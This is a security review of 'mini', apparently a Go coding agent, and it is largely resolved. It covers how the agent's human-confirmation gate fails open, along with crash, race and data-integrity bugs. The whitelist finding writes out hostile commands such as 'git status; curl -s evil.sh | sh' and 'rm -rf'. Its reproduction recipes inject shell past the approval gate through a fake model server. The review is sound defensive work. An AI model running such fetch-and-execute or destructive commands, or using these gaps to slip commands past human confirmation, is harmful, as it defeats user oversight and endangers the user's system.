# Adversarial review, 2026-11-18

A hostile-reading pass over the whole tree, commissioned to find defects under real
use rather than to summarize the design. Conducted by a review subagent against a
clean tree, with the most severe findings independently reproduced by the
orchestrating session; the two sets of evidence were kept separate and each claim is
labelled with its provenance (`[O]` orchestrator-confirmed, `[M]` reviewer's own).

**Scope as run:** ~34,200 lines, 11 packages, commit `164f279`. All 11 packages pass
`go test ./...`; the tree was left unmodified by the review itself.

**Headline:** the trust boundary is the weak part. Both controls between a model and
arbitrary shell fail *open* and fail *silently*, and the recurring cause is not
sloppy code but **the port dropping upstream's validation constraints while keeping
the comparisons that depended on them**.

## Index and status

IDs are stable; cite these in commit messages and follow-up docs rather than the
section headings, which will move as findings close.

| ID | Sev | One-line summary | Status |
|---|---|---|---|
| A-1 | Critical | Whitelist is start-anchored only, so a permitted prefix approves any trailing shell | **Fixed** 2026-11-18 - gate rewritten as an AST walk (`env.Decompose`, `ui/whitelist.go`); see `docs/whitelist-gate-hardening.md` |
| A-2 | High | `agent.mode` is unvalidated; any bad value silently means yolo (port regression) | **Fixed** 2026-11-18 - `agent.ValidateMode` at the `host.Open` funnel, and the gate now fails closed on an unknown mode |
| A-3 | High | Compaction panics the process when the context has no assistant row (`proj[cut]`) | **Fixed** 2026-11-18 - `pickCut` returns `(cut, ok)` and `compact` declines; the negative control still panics `index out of range` |
| A-4 | Medium | `go test -race ./agent/` is red: `Loop.Messages` is exported and mutated unlocked | **Fixed** 2026-11-18 - field unexported, writes under `l.mu`, `Messages()` returns a copy; the whole tree is now `-race` clean |
| A-5 | Medium | A wire tool call with no `id` re-indexes slots: mis-paired output, a turn that lies | **Fixed** 2026-11-18 - `slotEntry.idx` carries the wire index through the id filter |
| A-6 | Medium | A second `Open`/process sweeps another holder's *live* jobs; their outcome is discarded | **Fixed** 2026-11-18 - `sessions.opened_by` makes the one-driver stance enforceable; duplicate `Open` refused; `ReclaimJob` recovers a swept outcome. Not a lease - see resolution notes |
| A-7 | Medium | `missingkey=zero` where upstream uses `StrictUndefined`; bad template keys vanish | **Fixed** 2026-11-18 - `tpl.RenderStrict` for the prompt templates + `TestShippedPromptsRenderStrictly`; observation templates stay forgiving |
| A-8 | Low | Subagent rows consume the bash job cap; hitting it on promotion kills the command | **Fixed** 2026-11-18 - **the cap was deleted, not corrected**, and the promotion kill was removed. See the resolution notes; the severity was understated |
| A-9 | Low | Model-facing truncation cuts bytes, not runes, in two sites | **Fixed** 2026-11-18 - both sites cut runes now; the control reproduces the raw stray bytes that used to reach the model |
| A-10 | Low | `HasUndeliveredFiring` probes 32 rows, so an owed result can read as settled | **Fixed** 2026-11-18 - exact `COUNT(*)` per job (`CountUndeliveredFiringsFor`); the dead 8-row `PendingFirings` probe is deleted. Control fails at j33 of 40 |
| A-11 | Low | No cap on streamed content or tool calls per turn against a hostile server | **Fixed (bytes half)** 2026-11-18 - 8x-context-bytes ceiling per call, non-retryable; the per-turn action-count half is withdrawn as contrary to the no-count-limits stance |
| A-12 | Low | `context.AfterFunc` kill path can signal a process group after reaping | **Fixed** 2026-11-18 - the concurrent killer is gone entirely; signals now issue from `cmd.Cancel`, which `Wait` runs before it reaps. See the note below: it was not theoretical on Linux |
| A-13 | Low | `recordExit` dereferences `*row.EndedAt` behind an inconsistent guard | **Fixed** 2026-11-18, as a drive-by of the wake work (`job/local.go`) |
| A-14 | High | `TestGlobalEnvIsAppliedOnce` truncates the developer's real global `.env`, erasing the saved model/URL so the CLI re-runs the first-run wizard every start | **Fixed** 2026-11-18 - found by the owner in use, not by this review; see the note below |

## Resolution notes

Every High and Medium finding was fixed on 2026-11-18. Four things learned during the
fixes are worth keeping, because each contradicts something the review or the code
believed.

- **A-7 was live in the test fixtures, not merely hypothetical.** Enabling strict
  rendering immediately failed a test whose fake environment returned `nil` from
  `TemplateVars()`: the shipped system prompt interpolates `{{ .system }}`,
  `{{ .machine }}`, `{{ .release }}` and `{{ .version }}`, so that fixture had been
  rendering a prompt with those four values missing and nobody noticed - the exact
  silent hole the finding predicted. The fix included making the fake honest.
- **`missingkey=zero` does not print empty, it prints `<no value>`.** On a
  `map[string]any` the zero value is an untyped nil and text/template spells that
  out, so the forgiving path leaks Go internals into the prompt the model reads.
  That is a stronger argument for strict prompts than "a key vanishes". The
  observation templates keep `Render` because their context is genuinely per-result
  and sparse; `agent/prompt_test.go` asserts `<no value>` never survives into a
  shipped prompt.
- **A-6 was closed by enforcement, not by a lease.** The store's stance was already
  "one session, one driver; no flock/lease machinery" - what was wrong was its claim
  about the consequence ("only produces interleaved turns"). `sessions.opened_by`
  plus a liveness check makes the existing stance real without adding the heartbeat
  subsystem the codebase declined. Two consequences to remember: the cross-process
  refusal is **unix-only** (`host/alive_other.go` answers "not alive", which disables
  the refusal rather than risking a lockout), and a missed `Release()` after a crash
  is recovered by the same liveness check - a stale stamp costs a check, not the
  session. A genuine lease is still the answer if mini ever wants two drivers on one
  transcript.
- **A-8 was understated, and the fix was deletion.** The review scored it Low and
  described the harm as a long command killed at promotion. It is worse: the cap was
  enforced in `register`, which `Launch` calls for **every** command including plain
  foreground ones, so a parent with eight live children - each an agent-kind job
  registered on the parent's own manager - could not start `ls`. And the cap could not
  do what its comment claimed: a backgrounded job is a shell, hence a process tree, and
  the count is per-session rather than per-machine. `DefaultMaxJobs`, `Manager.MaxJobs`
  and `ErrCap` are gone with no replacement and no knob; `handoff` no longer kills a
  run that has already burned its budget, and reports it as burning-and-untracked
  instead, because a row that could not be written is not a reason to destroy work.
  `Manager.Start` may still kill, where nothing had run yet - the distinction is
  refusal-before-work versus destruction-after-work.
- **A-11 was split, and half of the review's recommendation was withdrawn.** It
  proposed capping `len(toolCalls)` per turn "to something like the job cap"; mini
  imposes no limit on the number of tool calls, in flight or total, so that half is
  contrary to the design and is gone. The **streamed-bytes** half was a real gap and is
  fixed: one call may send at most 8 whole contexts' worth of bytes, at the token
  estimator's 4 bytes per token (`responseBytesPerContextToken = 8 * 4`), derived from
  the window `DiscoverContextWindow` already resolved - the server's own answer, else
  `agent.context_window`, else `DefaultContextWindow`, which is 8 MiB at the default
  window. Overrun returns a non-retryable `response_too_large` `APIError`: retrying a
  flood would only re-download it. The model-list lookup was already bounded by
  `io.LimitReader`.
  What the control showed is worth recording: with the ceiling removed, an endless
  `: keepalive` stream does not fail at all, it **blocks the client forever** - which
  is the same fault as a wrong port or a proxy on the model's port, so this was never
  only a hostile-server case. The error now says so when no completion chunk had been
  parsed, rather than reporting only "too big".
- **A-4's convention did not survive a second reader - mine.** The wake test written
  the same day tripped the race by reading `l.Messages` from a test goroutine, which
  is the clearest possible evidence that a documented-but-unenforced rule on an
  exported field is not a rule. `TestMessagesCanBeReadWhileTheRunAppends` now pins
  the opposite: concurrent reading is legal and returns a non-aliasing copy.

All thirteen findings are closed. A-12 was mis-rated "theoretical" in this review and
in the first framing of the fix, and it is not. The group being signalled is a **leaf
external command** made session leader by `Setsid` - the integrated interpreter calls
the exec handler once per simple command, so there is no shell process and no single
group per job - which means the window opens once per leaf, not once per run. A pgid is
reusable the moment its leader is reaped; `kernel.pid_max` is 32768 by default on many
Linux systems with strictly sequential wraparound allocation; and mini's own workload
(pipelines, `make -j`, test runners) is the churn that walks it. The old handler slept
2s in an `AfterFunc` goroutine and signalled after, while `defer stop()` ran only once
`cmd.Wait()` had already reaped - a wide-open window, and the victim would be an
unrelated group wearing the same number, usually the user's own work since EPERM
protects everyone else's.

The fix delegates sequencing to `os/exec` instead of fencing a race: the whole
INT-to-KILL sequence runs inside `cmd.Cancel`, which `Wait` calls on its own goroutine
before reaping, so the process cannot be reaped while a signal is outstanding. No
goroutine of ours, no lock, no pidfd or `/proc` - and it matches the shape upstream's
`DefaultExecHandler` already uses, so the group semantics are the only deviation from
stock. One subtlety that made this non-obvious: `Cancel` is consulted only when the
context is attached to the `Cmd`, so the command is built with `exec.CommandContext`;
the bare `exec.Cmd{}` literal it replaced had no context to consult, which is precisely
why the callback was hand-installed.

Cost, measured and **accepted by the owner on 2026-11-18**: every cancellation and
timeout now pays the full `KillGrace` even when the command dies the instant SIGINT
lands, because `Wait` runs `Cancel` to completion (`TestTimeoutReturnsPartialOutput` 1s
to 3s; the env suite 7.1s to 15.2s, with `agent` and `job` also affected because both
cancel commands; full suite ~28s to ~84s). Normal completions are unaffected. There is
no cheap way out: asking "is the group empty yet" without reaping is not something
os/exec supports - `Signal(0)` succeeds on the zombie leader and a `WNOHANG` `Wait4`
would steal the reap - so the only faster designs either weaken the group guarantee or
put the fenced goroutine back.

Related, still open as a cleanup rather than a bug: `SetJobProcess` has no production
caller, so `jobs.pid` and `jobs.pgid` are NULL in every real row - dead columns
asserting that a job is a process, which the integrated shell makes untrue. They should
go, and until they do they are a trap for anyone implementing a lease (A-6's
`sessions.opened_by` deliberately uses mini's own pid for exactly this reason).

One behavioural note on A-10's fix: an **unreadable queue now reports owed rather
than settled**. The card field is named `Notified` but means "ended and nothing
has told the model yet", so a false negative is the lie this finding was about -
the tie goes to pessimism, and the store error is logged rather than swallowed.

### A-14 - found in use after the review, by the owner

A test that passes while destroying the developer's configuration.
`host/host_test.go` wrote its sentinel with `os.WriteFile` straight to
`config.GlobalConfigFile()`, which **truncates** - so every `go test ./host/`
replaced `~/Library/Application Support/mini/.env` with one junk line, deleting
`MINI_MODEL_NAME`, `MINI_BASE_URL` and `MINI_CONFIGURED`. The visible symptom was
the first-run wizard asking for a model and URL on every single start, which
invited exactly the wrong diagnosis: the gate in `needsFirstTimeSetup` had been
*correctly* fixed a day earlier (25671e7), so the obvious suspect was the config
read path, and the real culprit only showed up as a one-line `.env` with a test
sentinel in it and a fresh mtime.

Why the review missed it is worth keeping: its coverage note says `config/*` was
"read, not exercised", and a static reader has no reason to suspect a test of
writing outside a temp dir. It also breaks a rule the README states outright -
"Everything is offline and read-only" - in the one way that is invisible from
inside the test, because the test still passes.

Fix is two-layer, and the second layer is the important one: the test now
`t.Setenv`s `MINI_GLOBAL_CONFIG_DIR` to a temp dir, and `host/main_test.go`
defaults it for the whole package so any future test that forgets is contained by
construction. (`MINI_STATE_DIR` was already redirected per test by `newProcess`;
this was the other half of the same isolation, left unwired.)

Reproduced honestly in both directions, with the inherited `MINI_MODEL_NAME` from
the harness's own environment stripped so the file is the only variable: with the
restored file the CLI resolves `model=beamster/qwen` and starts; with the
sentinel-only file the test used to leave behind it prints
`Enter your default model:`. After the fix, a full `go test ./...` leaves the
real `.env` byte-identical.

**Note on recovered state:** the clobbered values were rebuilt from the session
store (`sessions.model`, 42 rows) as `MINI_MODEL_NAME='beamster/qwen'` plus
`MINI_CONFIGURED='true'`; `MINI_BASE_URL` was not recoverable and was left unset,
which is the same as the default `http://127.0.0.1:1234`. Run `mini config setup`
to change either - it will now stick.

## Addendum: confirmations, corrections, and provenance

These were established after the report was written, or by the second session, and
are the parts most at risk of being lost if the report is read cold later.

**A-1 provenance - inherited, not a port slip, but the Go tests mislead.** Upstream
`mini-swe-agent/src/minisweagent/agents/interactive.py:163` is
`re.match(r, action)`, which is start-anchored with no end anchor either, so prefix
matching is faithful porting. The port-specific harm is the *false comfort*:
`ui/interactive_test.go` `TestWhitelistIsPrefixAnchored` tests only the left edge and
its failure text ("approved a command that merely contains the pattern") reads as
though the whole command must match, while `TestWhitelistedActionsNeverPrompt`
blesses `echo .*` as a sample entry. A security reviewer trusting those tests would
conclude the right edge was considered. It was not.

**A-2 provenance - a genuine regression.** Upstream declares
`mode: Literal["human", "confirm", "yolo"] = "confirm"` (`interactive.py:25`), so
pydantic rejects a bad value at config load and the agent will not start. The Go port
kept the string comparison and dropped the type constraint, and nothing validates the
value set anywhere in the tree. So the fix belongs at the parse boundary
(`agent.ConfigFromMap`), which restores an invariant upstream already had - not only
in the gate.

**A-3 is worse than the report states.** `host/host.go:337` assigns
`agentCfg.ContextWindow, _ = sushi.DiscoverContextWindow(...)`: a **server-controlled**
number feeds `compactThreshold()` directly. A misconfigured or hostile server
reporting a small `context_length` therefore triggers compaction on the *first* model
query, collapsing the reachability from "run `/u`, work a while, press `/y`" to a
startup crash. Independently reproduced against the exported API with an isolated
history carrying no assistant row:
`panic: runtime error: index out of range [4] with length 4` at
`agent/compaction.go:236`, via `prepareContext:131` <- `Query:1395`. Only the
`cut <= head` guard exists, and it cannot catch `cut == len(proj)`.

**A-6 line numbers were stale; substance confirmed.** The cited sites (`host.go:494`,
`:505-514`) land in `Process.Close`. The real sites are **`host/host.go:394`**
(`s.SweepWarn = jobs.Sweep()` on every `Open`) and **`host/host.go:403-404`**
(`p.sessions[s.ID] = s` and `p.order = append(p.order, s.ID)`, with no existence
check). The comment immediately above the sweep asserts the exact assumption the
finding breaks - "a row still marked 'running' is a claim about a process this mini
does not own" - as a declaration rather than an enforcement: there is no lease, owner,
or flock anywhere in the path.

**A-4 was refined, and the production reader was cleared.** The reviewer assessed
`host/spawn.go:240` (`s.Loop.Resume(s.Loop.Messages)`), the one production read of the
documented-racy field, and cleared it: it runs inside `childRunner`'s closure on the
child's own job-runner goroutine and calls `child.Run` synchronously on that same
goroutine, so the read is sequential with the writer, not concurrent. Same verdict for
`endingOf`'s reads of `Loop.NCalls`/`Cost`. So this is an unenforced convention plus a
red `-race` suite, not a live production race. Note that a later test written against
this code *did* trip it by reading `l.Messages` from a test goroutine - which is the
best available evidence that the convention does not survive contact with a second
reader.

**A-1/A-2 blast radius includes delegation.** `host/spawn.go:93` routes a child's
confirmations to the parent's `Interactive` via `bubblingHooks`, so the same flawed
check gates every subagent's commands. The delegation design is otherwise sound and
fails *closed*: with no asker at all, anything that would prompt rejects with a reason
rather than deadlocking, and hook installation is deliberately ordered before the job
starts.

## Reproduction recipes

Both gate findings were confirmed end-to-end without a GPU, and the tests will need to
be re-run against any fix. Note that `-c` *replaces* the embedded config, so the base
file must be passed first for a layer to land.

```bash
go run ./testdata/fakesushi -addr :8009 -delay 5ms &
go build -o /tmp/mini ./cmd/mini

# A-2: `confirm` prompts and blocks; `Confirm` and `banana` execute silently.
/tmp/mini -p -m test-model --url http://127.0.0.1:8009 \
  -c mini.yaml -c agent.mode=banana -t "task" --exit-immediately </dev/null

# A-1: whitelist `echo`, yet `echo hi; touch /tmp/wlpwned` runs with no prompt and
# creates the file. Same script with no whitelist prompts and does not execute.
sed 's|ls -la|echo hi; touch /tmp/wlpwned|' testdata/sushi/toolcall.sse >/tmp/inject.sse
go run ./testdata/fakesushi -addr :8010 -scripts /tmp/inject.sse,testdata/sushi/submit.sse &
/tmp/mini -p -m test-model --url http://127.0.0.1:8010 \
  -c mini.yaml -c agent.mode=confirm -c 'agent.whitelist_actions=["echo"]' \
  -t "task" --exit-immediately </dev/null
```

## What else is known

Deliberately out of scope and not defects: the README's layout table omits the `host`
and `job` packages, its "single commit" claim is stale, there is no LICENSE, and
there is no CI - which is why A-4's red `-race` run nobody sees is not caught by
anything. The absence of SQLite schema versioning is a documented ruling.

---

# The review

## Verdict

The trust boundary is the weakest part of this codebase: the two controls that stand between a model and arbitrary shell (`agent.mode` and `agent.whitelist_actions`) both fail **open**, and both fail silently — one because the port dropped upstream's pydantic `Literal` validation, the other because prefix-anchored matching approves any trailing shell (inherited from `re.match`, but the port's own test names suggest it was checked). Confirmed by direct probe of `Interactive.BeforeExecute`. The single worst *crash* is in compaction: `pickCut` can legitimately return `len(proj)` and `compact` then indexes `proj[cut]`, which is a process-killing panic (mini installs no `recover` on the run seam) reachable from a real user sequence — run `mini -u`, do enough work, press `/y`. Below those, the transcript/slot machinery is mostly careful, but a wire tool call without an `id` silently mis-pairs observations with call ids and leaves a permanently-"aborted" turn that lies, and the job-registry state machine loses a job's real outcome when a second process sweeps it. `go test -race ./agent/` is red and nobody runs it. Concurrency in `job`, `gate`, `askqueue`, `ProjectContext` and the Fyne posting discipline held up under everything I threw at them; the bugs are in validation and index arithmetic, not in locks.

Provenance labels: **[O]** = independently confirmed by the orchestrator and re-verified by me; **[M]** = mine.

## Findings

### [CRITICAL] Whitelist approves any command that *starts* with a permitted pattern — trailing shell is unchecked
**Location:** `ui/interactive.go:27` (compile), `:36-44` (`shouldAskConfirmation`), `:62` (gate); tests `ui/interactive_test.go:213`, `:224`
**Failure mode:** With `agent.mode=confirm` and `agent.whitelist_actions=["git status"]`, a model call `git status; curl -s evil.sh | sh` (or `git status && rm -rf …`, `git status\nrm -rf …`, `$( … )`) never reaches the human. The whitelist regex is `"^(?:" + pattern + ")"` — start-anchored only. A user who whitelists anything gets `that-thing` plus the whole rest of the shell grammar. `mini -c agent.whitelist_actions=…` also accepts it from the CLI, and a subagent's commands are gated by the parent's same check (`host/spawn.go:93` → `bubblingHooks.BeforeExecute`), so delegation inherits it.
**Evidence:** CONFIRMED **[O]**, and I re-verified it independently at the gate rather than through the CLI. Probe in `/tmp/probe/wl` calling `ui.New(...).BeforeExecute` with a UI that records whether it was asked:
```
mode="confirm" wl=[echo] cmd="echo hi; touch /tmp/WLPWNED" -> prompted=false interrupted=false
mode="confirm" wl=[]     cmd="echo hi; touch /tmp/WLPWNED" -> prompted=true  interrupted=true
```
The orchestrator's end-to-end run (fakesushi + real `-p`) shows the file being created with no prompt. **This half is inherited, not a port slip**: upstream `interactive.py:163` is `re.match(r, action)` — also start-anchored only. The *port-specific* harm is the false comfort: `TestWhitelistIsPrefixAnchored` (`:224`) tests only the left edge and its failure text is "an unanchored whitelist pattern approved a command that merely contains the pattern", which reads as if the whole command must match; `TestWhitelistedActionsNeverPrompt` (`:213`) blesses `echo .*` as an example entry.
**Fix:** Require a full match to approve-by-whitelist: compile `"^(?:" + pattern + ")\\s*$"`, or keep prefix semantics but reject a pattern whose remainder contains a shell separator (`;`, `&&`, `|`, newline, `$(`, backtick) — the latter preserves upstream compatibility. Independently: state loudly in `whitelist_actions` help/config comments that entries are prefixes that permit arbitrary trailing shell, and add the missing right-edge test (`"echo"` must not approve `"echo hi; touch /tmp/x"`).

### [HIGH] `agent.mode` is unvalidated: any typo or wrong-case value silently converts confirm mode into yolo (port regression)
**Location:** `agent/agent.go:80` (`Mode: config.String(m, "mode", "confirm")`), `ui/interactive.go:37` (`if h.Cfg.Mode != "confirm" { return false }`)
**Failure mode:** The only meaningful values are `confirm`/`human`/`yolo` (`ui/slash.go:13`). A config containing `mode: Confirm`, `mode: confirmation`, `mode: confirm ` (trailing space from YAML editing) or any other string produces **no prompt and full execution**, with no warning. Same via `-c agent.mode=Banana`.
**Evidence:** CONFIRMED **[O]** (orchestrator's CLI run: `confirm` prompts, `Confirm`/`banana` execute silently). I re-verified at the gate:
```
mode="Confirm" wl=[]     cmd="echo hi; touch /tmp/WLPWNED" -> prompted=false
mode="banana"  wl=[]     ...                                -> prompted=false
mode="CONFIRM" wl=[echo] ...                                -> prompted=false
```
and I grepped for validation: the only places that read `mode` are `ui/slash.go:47`, `agent/agent.go:80/102`, `cmd/mini/main.go:648` — nothing checks the value set anywhere in the tree. **This is a regression against upstream**, which has `mode: Literal["human","confirm","yolo"] = "confirm"` (`mini-swe-agent/src/minisweagent/agents/interactive.py:25`) and therefore raises at config load on a bad value; the port kept the string comparison and dropped the type constraint. Note the same file also has `human` mode returning `("", false)` in `NextHumanCommand` (`ui/interactive.go:127`) so a mangled `human` silently becomes model-driven too.
**Fix:** Fail closed and fail loud: validate in `agent.ConfigFromMap` (or `host.Open`) against `{confirm, human, yolo}` and return an error naming the bad value — that restores the upstream invariant at the parse boundary. Additionally make `shouldAskConfirmation` fail closed (`return mode != "yolo"` semantics, i.e. ask unless the mode is *known* to be non-interactive), so an unknown value can never widen authority.

### [HIGH] Compaction panics the whole process when the transcript has no assistant turn (`proj[cut]` index out of range)
**Location:** `agent/compaction.go:302` (`return len(proj) // no assistant at all`) consumed at `agent/compaction.go:236` (`firstKept := turnOf(proj[cut])`), reached from `:156`
**Failure mode:** `pickCut` walks back for a tail budget, then looks for an `assistant` row to land on; if the projected context contains **no** assistant message it returns `len(proj)`. `compact` only guards `cut <= head`, then slices `proj[cut]` → panic. `host.Session.Run` deliberately installs no `recover` (`host/session.go` "A panic is not caught here"), so this kills the GUI and every other session in the process; live job rows are left `running` and get swept to `orphaned` on next open.
Reachable sequence: start in human mode (`mini -u` / `/u`), run enough commands that the estimate crosses `compact_threshold_ratio × context_window` (human-mode turns are `role:"user"` + tool observations — never `assistant`, see `agent/agent.go:1382-1390`), then type `/y` so the next `Query` reaches `prepareContext`. Also reachable on the reactive overflow path (`agent/agent.go:1409`) for a first step whose history holds only a queued/wake user message (`agent/agent.go:1174`, `:1377`) — no assistant row yet.
**Evidence:** CONFIRMED **[M]** twice.
(a) Direct: a `Loop` with `ContextWindow=4096`, `CompactThresholdRatio=0.9`, `CompactKeepTokens=500` and `[system, instance, user]` → `panic: runtime error: index out of range [3] with length 3 … agent.(*Loop).compact() agent/compaction.go:244`.
(b) End-to-end through the exported API (`Run` with a `Hooks` that returns 8 human commands, then `/y`):
```
panic: runtime error: index out of range [18] with length 18
  agent.(*Loop).compact(...) /Users/victor/src/llm_stuff/mini/agent/compaction.go:236
  agent.(*Loop).prepareContext(...) compaction.go:131
  agent.(*Loop).Query(...) agent/agent.go:1395
```
**Fix:** Guard the degenerate cut: after `cut := pickCut(...)` add `if cut >= len(proj) { l.logger().Warn("compaction: no assistant boundary; nothing to compact"); return false }` (and keep the `cut <= head` check). Better, make `pickCut` return `(cut int, ok bool)` so no caller can forget; the `len(proj)` sentinel is the kind of value that must be re-checked at every use site. Also clamp `n` for negative `ExtraKeptN` in `model/compaction.go:75-80` (`if n < 0 { n = 0 }`) — `out[len(out)-n:]` panics on a negative kept_n read back from a corrupt row.

### [MEDIUM] `go test -race ./agent/` is red: `Loop.Messages` is an exported field mutated with no lock
**Location:** `agent/agent.go:1060` (`l.Messages = append(l.Messages, msgs...)`), documented-but-unenforced contract at `agent/agent.go:842-844`; conflicting reader `agent/pause_test.go:113-115` (holds `l.mu`)
**Failure mode:** `l.mu` guards `snap`/`queued`/`runCtx`/`cancelTurn`, not `Messages`/`NCalls`/`Cost`. Any goroutine that reads the exported `Loop.Messages` while a run is stepping is a race, and the compiler/runtime cannot help because it is an exported field on a struct everybody passes around. Today the only production reader is `host/spawn.go:240`.
**Evidence:** CONFIRMED **[O]**: `go test -race -count=1 ./agent/` → `--- FAIL: TestPauseLeavesTheTurnInFlightToFinish … race detected`, report shows `addMessages() agent.go:1060` (write, agent goroutine) vs `pause_test.go:113` (read, test goroutine). All other packages are clean under `-race`.
I assessed the production reader and **it is safe**: `spawn.go:240` is inside `child.runChildTurn`, invoked from `childRunner`'s closure, which executes on the child's own job-runner goroutine and calls `child.Run` synchronously on that same goroutine — so the read is sequential with the writer, not concurrent. Same for `endingOf`'s reads of `child.Loop.NCalls/Cost` (`spawn.go:405`). `bubblingHooks.BeforeExecute`'s `b.child.Loop.TemplateVars()` (`spawn.go:528`) also runs on the child's run goroutine. The GUI never reads `Messages` (only `Snapshot()`).
**Fix:** Make the field unexported (`Messages` → `messages`) with `Snapshot()`/`History()` accessors, and fix `pause_test.go` to use them; or take `l.mu` in `addMessages`/`Run`'s `l.Messages = nil`. Then wire `-race` into whatever you run before merging — an agent package whose own test suite detects a race and stays green without `-race` is a standing invitation to add the real one.

### [MEDIUM] A wire tool call with no `id` shifts every pre-allocated slot: wrong output paired to a call id, a permanently "aborted" turn, and a duplicate answer
**Location:** `session/turns.go:265-267` (`if id == "" { continue }` filters and re-indexes entries) vs `session/turns.go:223-225` (inserts `idx = i`, the *filtered* position) vs `session/calls.go:46` (looks up `(turn, idx)` by the **action** index)
**Failure mode:** A server (or a partial/fragmenting stream — `model/stream.go:136-140` only stores `"id"` when a chunk carries it) emits `tool_calls = [{no id, "AAA"}, {id:"X", "BBB"}]`. `recordCallTurn` pre-allocates one slot and stamps it `idx=0`, but action index 0 is `AAA`. So `AAA` inherits `X`'s tcno/result file/slot, `BBB` gets an on-demand row, `X`'s placeholder turn is **never filled**, and the observation for `BBB` is appended as a second turn carrying `tool_call_id="X"`.
**Evidence:** CONFIRMED **[M]**, probe against a fresh temp store:
```
action0 (no id, AAA) -> tcno=1     action1 (id X, BBB) -> tcno=2
--- replayed transcript ---
role=tool tool_call_id=X  content={"exception_info":"run ended before the result of this command was recorded","returncode":-1}  cmd=BBB
role=user               content="out-of-AAA"   cmd=AAA
role=tool tool_call_id=X  content="out-of-BBB" cmd=BBB
```
The rebuilt context now contains two tool results for call `X` (one of them a fabricated "run ended early" lie) and the pairings are transposed. `model.ProjectContext`/`requestBody` replay that verbatim, so the next request either 400s on strict servers or feeds the model a wrong history — and invariant 1 ("the full transcript in the store must never change") is violated at write time, so no later repair is possible.
**Fix:** Carry the wire index in `slotEntry` (`idx int`) and insert with `e.idx` instead of the loop position, so filtering an id-less call cannot renumber the survivors. Also make `fillSlot` refuse to leave an `aborted` placeholder behind when the same turn later produced a real result for that `tool_call_id` — today nothing notices the duplicate.

### [MEDIUM] A second process (or a second `Open`) on the same session id sweeps the first holder's *live* jobs to `orphaned`, and their real outcome is then silently discarded
**Location:** `host/host.go:494` (`s.SweepWarn = jobs.Sweep()` on every `Open`), `host/host.go:505-514` (`p.sessions[s.ID] = s` with no existence check), `session/jobs.go:329-333` (sweep UPDATE), `job/local.go:415-421` (`ErrUnknownJob` swallowed)
**Failure mode:** Invariant 3 assumes "a job found running at open" means its owner is dead. Two processes driving one session breaks that assumption: `mini -r <uuid>` while a GUI tab holds the same session (WAL + `busy_timeout` let the second process open fine — `session/store.go:186-192` only *declares* this unsupported, nothing enforces it). The second `Open` sweeps the first's running rows to `orphaned` **and queues an `orphaned` firing** (`session/jobs.go:352-357`), which the first process's next step boundary delivers to its model as "your job was orphaned; nobody owns it" while the process is still burning. When that job actually exits, `FinishJob`'s `WHERE … state='running'` matches nothing → `ErrUnknownJob` → `recordEndLocked` returns `nil` *without logging and without `recordExit`* → the true exit code and its firing are lost forever. In-process, the same double-open also orphans the first `Session` object from the registry (`p.order` keeps a duplicate id, `p.sessions` keeps only the second), so `Process.Close` closes the second one twice and never reaps the first's jobs.
**Evidence:** CONFIRMED by line-by-line path (`jobs.go:329` UPDATE has no owner/lease concept; `local.go:418` swallows exactly the error that the swept row provokes). SUSPECTED reachability: I did not run two processes; the GUI's own picker opens by directory, not by resume (`ui/shell.go:391-426`), so in-process duplicate resume needs `Opener`/`OpenSibling` misuse or a future resume UI. The cross-process case is squarely reachable.
**Fix:** Refuse to sweep rows that are too young to be orphans, or take a real lease: stamp `sessions` with an owner (`pid`+start-time, or `flock` on the db file) at `Open` and only sweep rows whose owner is gone. Minimum viable: have `Open` return an error if `p.sessions[s.ID]` already exists, and in `SweepOrphanedJobs` skip rows whose `started_at` is within the last N seconds and log them instead. And stop swallowing `ErrUnknownJob` at `job/local.go:418` — "my row was taken over by someone else" is exactly the fact a log line is for.

### [MEDIUM] Template rendering drops unknown keys silently where upstream fails hard (`missingkey=zero` vs `StrictUndefined`)
**Location:** `tpl/tpl.go:42` (`Option("missingkey=zero")`), used by `agent/agent.go:1056`, `model/actions.go:172`, `:209`
**Failure mode:** Same class as finding 2 — a dropped upstream safety constraint. Upstream renders prompts with `Template(t, undefined=StrictUndefined)` (`mini-swe-agent/agents/default.py:70`), so `{{ model_name }}` misspelled, or a key renamed in Go but not in a user YAML config, raises at the first render. In mini the reference resolves to the zero value: the system/instance/observation/format-error template renders **without that content** and nothing says so. Concretely: a config written against the Python names silently ships a system prompt with no tool listing or no `${OUTPUT_PATH}` spill pointer; the model then behaves worse and every trajectory looks like a model-quality problem.
**Evidence:** CONFIRMED code divergence (both sources read); SUSPECTED impact — I did not construct a mis-rendered prompt end to end because the shipped `config/configs/*.yaml` keys presumably match. The comment at `tpl/tpl.go:34-36` justifies it as "every context here is built by this program", which is exactly the assumption a user-authored template violates.
**Fix:** Keep the forgiving behaviour for the harness-owned context but fail loudly for human-supplied templates: render config templates with `missingkey=error` (or pre-validate that every `{{ .X }}` in `system_template`/`instance_template`/`observation_template` appears in `TemplateVars()` keys) at startup, and log at warn level in `formatObservations`.

### [LOW] Subagent rows consume the bash job cap, and hitting the cap at promotion time kills the command it was promoting
**Location:** `job/local.go:280-283` (`Detach` asks `CountRunningJobs`, unkinded) vs `job/job.go:137-143` (`maxJobsFor` exempts `KindSubagent`), `session/jobs.go:231-241` (no kind filter), `agent/agent.go:786-791` (`handoff` kills on refusal)
**Failure mode:** `Detach`'s exemption is only about *creating* agent rows; the count it compares against includes every `running` row of the session, agent or not. A parent that fans out 8 subagents (DefaultMaxJobs=8) can then never background anything: a foreground command that outruns its budget hits `ErrCap`, and `handoff` responds with `_ = run.Kill()` — the long-running command is destroyed at the promotion point, which is precisely the outcome `runCommand`'s doc says the whole design exists to avoid ("a design that ran the command normally and promoted it afterwards would be promoting something it had already killed"). The remedy the model is told ("stop one with job_kill first") means killing a subagent.
**Evidence:** CONFIRMED by code path (three cited locations; the SQL has no kind predicate). Not probed.
**Fix:** Count only rows of the run's own kind (`WHERE session_id = ? AND state='running' AND kind = ?`), matching `maxJobsFor`'s stated intent; and on a cap refusal during promotion, leave the run burning as a detached-but-uncounted run (or raise the cap for the already-running process) rather than killing it — the cap protects against *starting* work, not against losing it.

### [LOW] Model-facing truncation cuts bytes, not runes
**Location:** `host/spawn.go:381-382` (`r[:200]` on a byte length), `agent/agent.go:668-676` (`readJobBody` cuts `buf[:n]`)
**Failure mode:** A subagent report containing non-ASCII (a path with `é`, CJK prose, an emoji) gets its `Reason` and the wake body cut mid-rune → a dangling `\xc3` reaches the model as U+FFFD and, in the wake case, up to 10 KB of the report's last character is mangled. No crash; JSON stays valid (Go replaces invalid bytes on marshal).
